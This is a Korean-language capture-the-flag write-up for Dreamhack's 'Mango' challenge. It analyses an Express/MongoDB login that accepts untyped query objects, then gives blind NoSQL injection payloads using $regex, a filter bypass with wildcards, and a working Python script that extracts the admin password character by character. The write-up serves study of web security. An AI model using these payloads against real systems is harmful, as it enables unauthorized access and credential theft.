# [Dreamhack Wargame] Mango
### [🚩 Mango](https://dreamhack.io/wargame/challenges/90/)
  <img width="1073" alt="mango_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/bb11479b-4ed6-4d14-b228-6582eb9cb061">

<br/><br/>

## 문제 파일(main.js) 분석
```javascript
const express = require('express');
const app = express();

const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/main', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;

// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}

const BAN = ['admin', 'dh', 'admi']; // 필터링할 문자열

// 필터링 함수 (이러한 형태의 문자열 필터링은 보안상 안전한 코딩 방식이 아님! → Injection이 발생할 수 있는 근본적인 문제점을 해결해야 함)
filter = function(data){
    const dump = JSON.stringify(data).toLowerCase(); // 전달받은 data를 모두 소문자로 변환
    var flag = false; // flag: 필터링할 문자열이 존재하는지를 나타내는 boolean 변수
    
    BAN.forEach(function(word){ // 필터링할 문자열이 있는지 반복문을 통해 검사함
        if(dump.indexOf(word)!=-1) flag = true; // 필터링할 문자열이 존재하면 flag에 true를 대입함
    });
    return flag; // true이면 필터링할 문자열이 존재함을 의미하고, false이면 필터링할 문자열이 존재하지 않음을 의미
}



// 로그인 페이지 요청 시 실행되는 코드
app.get('/login', function(req, res) {
    if(filter(req.query)){ // 이용자의 요청에 포함된 쿼리를 filter 함수로 필터링함
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query; // 이용자가 전달한 uid와 upw를 가져옴

    db.collection('user').findOne({ // user 컬랙션에서 uid, upw 검색
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});

app.get('/', function(req, res) {
    res.send('/login?uid=guest&upw=guest');
});

app.listen(8000, '0.0.0.0');
```

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 코드
로그인 페이지를 구성하는 코드에서 MongoDB에 쿼리를 전달하는 부분을 보면 쿼리 변수의 타입을 검사하지 않고 그대로 넘겨주고 있음
```javascript
onst {uid, upw} = req.query; // 이용자가 전달한 uid와 upw를 가져옴

db.collection('user').findOne({ // user 컬랙션에서 uid, upw 검색
    'uid': uid,
    'upw': upw,
}, ...)
```
* ```string``` 외에도 다양한 형태의 ```object```도 쿼리로 전달될 수 있음

<br/><br/>

### 익스플로잇
로그인에 성공했을 시에 이용자의 ```uid```만 출력하기 때문에 ```upw```를 획득하기 위해서는 **Blind NoSQL Injection**을 사용해야 함

1. Blind NoSQL Injection Payload 생성
    - MongoDB의 ```$regex``` 연산을 사용하면 정규 표현식을 통해 데이터를 검색할 수 있음
        + ```upw```가 일치하는 경우 ```uid```, 아닌 경우 ```undefined``` 문자열이 출력되는 것을 통해 참/거짓을 확인할 수 있음
        + 입력해야 하는 Payload
            ```
            {"uid": "admin", "upw": {"$regex": ".*"}}
            ```

2. filter 우회
    - ```admin```, ```dh```, ```admi``` 문자열이 필터링하고 있음 → 정규표현식에서 임의 문자를 의미하는 ```.```을 이용하여 쉽게 우회 가능
        + uid에 ```admin``` 대신에 ```ad.in```을 입력하면 ```admin```, ```admi``` 필터링 우회 가능
        + upw에 ```DH{...}``` 대신에 ```D.{.*```를 입력하면 ```dh``` 필터링 우회 가능
    + filter 우회를 위해 입력해야 하는 Payload
        ```
        {"uid": "ad.in", "upw": {"$regex": "D.{.*"}}
        ```

3. Exploit(mango_exploit.py) 작성
    - 정규표현식을 이용해 한 글자씩 비밀번호를 알아내야 하므로 공격을 자동화하는 것이 좋음
    - 익스플로잇 스크립트
        ```python
        import requests, string

        HOST = 'http://localhost' # 접속정보의 http://host3.dreamhack.games:포트번호 입력
        ALPHANUMERIC = string.digits + string.ascii_letters # 비밀번호 문자 범위 지정
        SUCCESS = 'admin' # 성공하면 admin 문자열이 출력됨

        flag = ''
        for i in range(32):
	        for ch in ALPHANUMERIC:
		        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}') # 2번에서 작성한 payload를 사용해 요청을 전송함
		        if response.text == SUCCESS: # 쿼리가 성공이라면 해당 문자를 flag에 추가함
			        flag += ch
			        break
	        print(f'FLAG: DH{{{flag}}}')
        ```

4. Exploit script 실행 <br/>
      <img width="735" alt="mango_exploit_1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/e4dd8d87-bc82-4102-8a83-4e1197172f32">
      <img width="740" alt="mango_exploit_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/80ed6dc0-6449-4d46-92e3-2bf00bba1701">
